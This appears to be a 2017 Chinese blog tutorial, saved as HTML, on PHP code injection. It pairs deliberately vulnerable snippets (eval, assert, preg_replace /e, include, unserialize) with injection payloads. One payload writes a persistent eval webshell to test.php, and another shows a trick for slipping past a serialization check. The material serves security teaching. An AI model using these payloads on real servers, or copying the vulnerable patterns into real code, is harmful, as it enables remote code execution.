@@ -1,0 +1,997 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="PHP,代码注入,命令注入," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/ico/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="代码注入和命令注入代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做PHP代码执行,而命令注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做系统命令执行。可以看出代码注入攻击和命令注入攻击是类似的，不同点在于，代码注入攻击要实现的功能限制在注入的语言本身，而命令注入是利用已有的系统命令，通常受shell限制。">
+<meta name="keywords" content="PHP,代码注入,命令注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP代码注入和命令注入">
+<meta property="og:url" content="http://www.beesfun.com/2017/04/18/PHP代码注入和命令注入/index.html">
+<meta property="og:site_name" content="Ethan&#39; Blog">
+<meta property="og:description" content="代码注入和命令注入代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做PHP代码执行,而命令注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做系统命令执行。可以看出代码注入攻击和命令注入攻击是类似的，不同点在于，代码注入攻击要实现的功能限制在注入的语言本身，而命令注入是利用已有的系统命令，通常受shell限制。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-08-31T01:14:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP代码注入和命令注入">
+<meta name="twitter:description" content="代码注入和命令注入代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做PHP代码执行,而命令注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做系统命令执行。可以看出代码注入攻击和命令注入攻击是类似的，不同点在于，代码注入攻击要实现的功能限制在注入的语言本身，而命令注入是利用已有的系统命令，通常受shell限制。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.beesfun.com/2017/04/18/PHP代码注入和命令注入/"/>
+
+
+
+
+
+  <title> PHP代码注入和命令注入 | Ethan' Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=63078337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ethan' Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://www.beesfun.com/2017/04/18/PHP代码注入和命令注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ethan">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/15061633">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ethan' Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                PHP代码注入和命令注入
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-18T09:16:10+08:00">
+                2017-04-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="代码注入和命令注入"><a href="#代码注入和命令注入" class="headerlink" title="代码注入和命令注入"></a>代码注入和命令注入</h2><p>代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做<code>PHP代码</code>执行,而命令注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做<code>系统命令</code>执行。<br>可以看出代码注入攻击和命令注入攻击是类似的，不同点在于，代码注入攻击要实现的功能限制在注入的语言本身，而命令注入是利用已有的系统命令，通常受shell限制。</p>
+<a id="more"></a>
+<h2 id="代码注入攻击"><a href="#代码注入攻击" class="headerlink" title="代码注入攻击"></a>代码注入攻击</h2><p>代码注入攻击一般出现在不安全的使用某些函数，文件包含导致代码注入攻击，反序列化导致的代码注入攻击。</p>
+<h3 id="常见的相关函数"><a href="#常见的相关函数" class="headerlink" title="常见的相关函数"></a>常见的相关函数</h3><p>代码执行函数有: <code>eval</code>, <code>assert</code>, 正则匹配函数:<code>preg_replace</code>, 动态代码执行函数: <code>create_function</code>, <code>call_user_func</code>, <code>call_user_func_array</code>。</p>
+<ul>
+<li>eval</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 1. 没有任何过滤</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@<span class="keyword">eval</span>($_GET[<span class="string">"cmd"</span>]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">?cmd=phpinfo();</div><div class="line">?cmd=fputs(fopen(<span class="string">'test.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[test])?&gt;'</span>)</div><div class="line"></div><div class="line"><span class="comment"># 2. addslashes 过滤</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$cmd = @(string)$_GET[<span class="string">"cmd"</span>];</div><div class="line"><span class="keyword">eval</span>(<span class="string">'$cmd="'</span> . addslashes($cmd) . <span class="string">'";'</span>);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="comment"># $&#123;$&#123;&#125;&#125; 绕过</span></div><div class="line">cmd=$&#123;$&#123;phpinfo()&#125;&#125;</div><div class="line"></div><div class="line"><span class="comment"># 3 双引号包含过滤</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$cmd = <span class="string">"echo \"hello "</span> . $_GET[<span class="string">'cmd'</span>] . <span class="string">"\";"</span>;</div><div class="line"><span class="keyword">eval</span>($cmd);</div><div class="line"></div><div class="line"><span class="comment"># $&#123;$&#123;&#125;&#125; 绕过</span></div><div class="line">cmd=$&#123;$&#123;phpinfo()&#125;&#125;</div></pre></td></tr></table></figure>
+<p><code>${${}} 绕过</code>是利用可变变量的二次嵌套，执行里面花括号内的代码，如: <code>echo &quot;${${phpinfo()}}&quot;;</code>, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。</p>
+<p>PHP可变变量可以无需二次嵌套，一次也可以执行，<code>echo &quot;${phpinfo()}&quot;;</code>这种情况是不能执行的，而<code>echo &quot;${/**/phpinfo()}&quot;;</code>是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，<code>空格，tab，注释，回车</code>是各种语法分析引擎中常见的分割字符，<code>@</code>是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
+<p><strong> php &gt;= 4.3 </strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="string">"$&#123; phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;    phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;/**/phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;</span></div><div class="line"><span class="string">phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;@phpinfo()&#125;"</span>;</div><div class="line"></div><div class="line"><span class="string">"$&#123;( string )phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;phpinfo[phpinfo()]&#125;"</span>;</div><div class="line"></div><div class="line"><span class="string">"&#123;$phpinfo[phpinfo()]&#125;"</span>;</div><div class="line"><span class="string">"&#123;$&#123;phpinfo()&#125;&#125;"</span>;</div><div class="line"><span class="string">"$&#123;$&#123;phpinfo()&#125;&#125;"</span>;</div></pre></td></tr></table></figure>
+<p><strong> 更新：php&gt;=5.5 </strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"$&#123;phpinfo()&#125;"</span>;</div></pre></td></tr></table></figure>
+<p>执行phpinfo().</p>
+<ul>
+<li>assert</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@assert($_GET[<span class="string">"cmd"</span>]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">cmd=phpinfo();</div></pre></td></tr></table></figure>
+<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><p>preg_replace()函数可以引发代码执行，源于PCRE (Perl Compatible Regular Expressions) 中的e(PREG_REPLACE_EVAL)选项，<br>这个选项会把replacement中的内容当做PHP代码执行，并取返回结果的值，其中后项引用可以是<code>$1</code>，也可以是<code>\\1</code>。<br>当replacement 参数构成一个合理的php 代码字符串的时候，<code>/e</code> 修正符使preg_replace()，将replacement 参数当做php 代码执行。</p>
+<ul>
+<li>第一个参数 pattern的代码注入</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># magic_quotes_gpc=Off时，导致代码执行。</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$regexp = $_GET[<span class="string">'reg'</span>];</div><div class="line">$var = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</div><div class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)$regexp"</span>, <span class="string">'\\1'</span>, $var);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>提交：<code>reg=%3C\/php%3E/e</code>, 执行 phpinfo(), 即pattern参数注入<code>/e</code>修正符。</p>
+<p>一般情况是不会有<code>e</code>选项的，我们可以通过<code>%00</code>截断等方式来添加</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">$regexp = $_GET[<span class="string">'re'</span>];  </div><div class="line">$var = <span class="string">'&lt;tag&gt;phpinfo()&lt;/tag&gt;'</span>;  </div><div class="line">preg_replace(<span class="string">"/&lt;tag&gt;(.*?)$regexp&lt;\/tag&gt;/"</span>, <span class="string">'\\1'</span>, $var);  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>提交：<code>reg=%3C\/php%3E/e%00</code>.</p>
+<ul>
+<li>第二个参数replacement</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># /e 修正符使preg_replace()，将replacement 参数当做php 代码执行</div><div class="line">&lt;?php</div><div class="line">preg_replace(&quot;//e&quot;, $_GET[&apos;cmd&apos;], &quot;cmd test&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>提交:<code>cmd=phpinfo()</code></p>
+<ul>
+<li>第三个参数</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line">preg_replace(<span class="string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span>, <span class="string">"\\1"</span>, $_GET[<span class="string">'h'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>提交：<code>h=[php]phpinfo()[/php]</code>。</p>
+<h4 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h4><ul>
+<li>array_map</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$evil_callback = $_GET[<span class="string">'callback'</span>];</div><div class="line">$some_array = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</div><div class="line">$new_array = array_map($evil_callback, $some_array);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>提交 <code>http://127.0.0.1/array_map.php?callback=phpinfo</code>, 即执行<code>phpinfo()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">array_map()</div><div class="line">usort(), uasort(), uksort()</div><div class="line">array_filter()</div><div class="line">array_reduce()</div><div class="line">array_diff_uassoc(), array_diff_ukey()</div><div class="line">array_udiff(), array_udiff_assoc(), array_udiff_uassoc()</div><div class="line">array_intersect_assoc(), array_intersect_uassoc()</div><div class="line">array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()</div><div class="line">array_walk(), array_walk_recursive()</div><div class="line">xml_set_character_data_handler()</div><div class="line">xml_set_default_handler()</div><div class="line">xml_set_element_handler()</div><div class="line">xml_set_end_namespace_decl_handler()</div><div class="line">xml_set_external_entity_ref_handler()</div><div class="line">xml_set_notation_decl_handler()</div><div class="line">xml_set_processing_instruction_handler()</div><div class="line">xml_set_start_namespace_decl_handler()</div><div class="line">xml_set_unparsed_entity_decl_handler()</div><div class="line">stream_filter_register()</div><div class="line">set_error_handler()</div><div class="line">register_shutdown_function()</div><div class="line">register_tick_function()</div></pre></td></tr></table></figure>
+<h3 id="文件包含导致代码注入攻击"><a href="#文件包含导致代码注入攻击" class="headerlink" title="文件包含导致代码注入攻击"></a>文件包含导致代码注入攻击</h3><p>PHP文件包含会执行包含文件的代码，当开启了远程文件包含，则非常容易引起代码注入攻击。远程文件包含条件: <code>allow_url_fopen=On</code>, <code>allow_url_include=On</code>, 文件包含相关函数有: <code>include</code>, <code>include_once</code>, <code>require</code>, <code>require_once</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>($_GET[<span class="string">'cmd'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>提交：<code>cmd=data:text/plain,%3C?php%20phpinfo%28%29;?%3E</code>, 即执行phpinfo()。</p>
+<h3 id="反序列化导致的代码注入攻击"><a href="#反序列化导致的代码注入攻击" class="headerlink" title="反序列化导致的代码注入攻击"></a>反序列化导致的代码注入攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $var = <span class="string">''</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;var);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">unserialize($_GET[<span class="string">'saved_code'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>提交: <code>unserialize.php?saved_code=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo%28%29;%22;}</code>,即执行phpinfo()</p>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>有一些程序中会判断用户输入是不是一个序列化的数据，常见的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$token = $data[<span class="number">0</span>];  </div><div class="line"><span class="keyword">switch</span> ( $token ) &#123;  </div><div class="line">    <span class="keyword">case</span> <span class="string">'s'</span> :  </div><div class="line">        <span class="keyword">if</span> ( <span class="string">'"'</span> !== $data[$length<span class="number">-2</span>] )  </div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;  </div><div class="line">    <span class="keyword">case</span> <span class="string">'a'</span> :  </div><div class="line">    <span class="keyword">case</span> <span class="string">'O'</span> :  </div><div class="line">        <span class="keyword">return</span> (bool) preg_match( <span class="string">"/^&#123;$token&#125;:[0-9]+:/s"</span>, $data );  </div><div class="line">    <span class="keyword">case</span> <span class="string">'b'</span> :  </div><div class="line">    <span class="keyword">case</span> <span class="string">'i'</span> :  </div><div class="line">    <span class="keyword">case</span> <span class="string">'d'</span> :  </div><div class="line">        <span class="keyword">return</span> (bool) preg_match( <span class="string">"/^&#123;$token&#125;:[0-9.E-]+;\$/"</span>, $data );</div></pre></td></tr></table></figure></p>
+<p>这个可以用+来绕过，这也属于PHP的一种特性: <code>O:+4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;}</code></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+            <a href="/tags/代码注入/" rel="tag"># 代码注入</a>
+          
+            <a href="/tags/命令注入/" rel="tag"># 命令注入</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/04/12/sklearn训练逻辑回归和感知机模型/" rel="next" title="sklearn训练逻辑回归和感知机模型">
+                <i class="fa fa-chevron-left"></i> sklearn训练逻辑回归和感知机模型
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/04/21/play渗透框架XXE实体攻击/" rel="prev" title="play渗透框架XXE实体攻击">
+                play渗透框架XXE实体攻击 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://avatars3.githubusercontent.com/u/15061633"
+               alt="Ethan" />
+          <p class="site-author-name" itemprop="name">Ethan</p>
+           
+              <p class="site-description motion-element" itemprop="description">personal blog :)</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/hxer/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友链
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#代码注入和命令注入"><span class="nav-number">1.</span> <span class="nav-text">代码注入和命令注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码注入攻击"><span class="nav-number">2.</span> <span class="nav-text">代码注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见的相关函数"><span class="nav-number">2.1.</span> <span class="nav-text">常见的相关函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-replace"><span class="nav-number">2.1.1.</span> <span class="nav-text">preg_replace</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他函数"><span class="nav-number">2.1.2.</span> <span class="nav-text">其他函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含导致代码注入攻击"><span class="nav-number">2.2.</span> <span class="nav-text">文件包含导致代码注入攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化导致的代码注入攻击"><span class="nav-number">2.3.</span> <span class="nav-text">反序列化导致的代码注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过方法"><span class="nav-number">2.3.1.</span> <span class="nav-text">绕过方法</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ethan</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
